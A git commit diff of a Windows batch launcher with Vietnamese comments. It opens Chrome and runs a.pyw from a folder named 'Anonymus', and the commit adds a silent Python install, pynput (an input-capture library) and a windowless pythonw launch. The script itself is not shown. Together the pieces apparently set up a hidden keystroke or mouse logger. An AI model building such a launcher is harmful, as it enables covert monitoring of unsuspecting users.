7b59d17a56824d022b376cc39b093f428c5fc0a7
VietPh37030 <145828354+VietPh37030@users.noreply.github.com>
2024-08-05 13:03:04 +0700

    Update a.bat

--- a.bat
+++ a.bat
@@ -2,3 +2,20 @@ start "" "C:\Program Files\Google\Chrome\Application\chrome.exe"
 D:
 cd Anonymus
 start "" "D:\Anonymus\a.pyw"
+@echo off
+
+:: Kiểm tra xem Python đã được cài đặt chưa
+where python >nul 2>nul
+if %ERRORLEVEL% NEQ 0 (
+    echo Python is not installed. Installing Python...
+    :: Tải và cài đặt Python
+    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.2/python-3.11.2-amd64.exe' -OutFile 'python_installer.exe'"
+    start /wait python_installer.exe /quiet InstallAllUsers=1 PrependPath=1
+)
+
+:: Cài đặt các thư viện cần thiết
+python -m pip install --upgrade pip
+python -m pip install pynput
+
+:: Chạy ứng dụng Python
+pythonw a.pyw
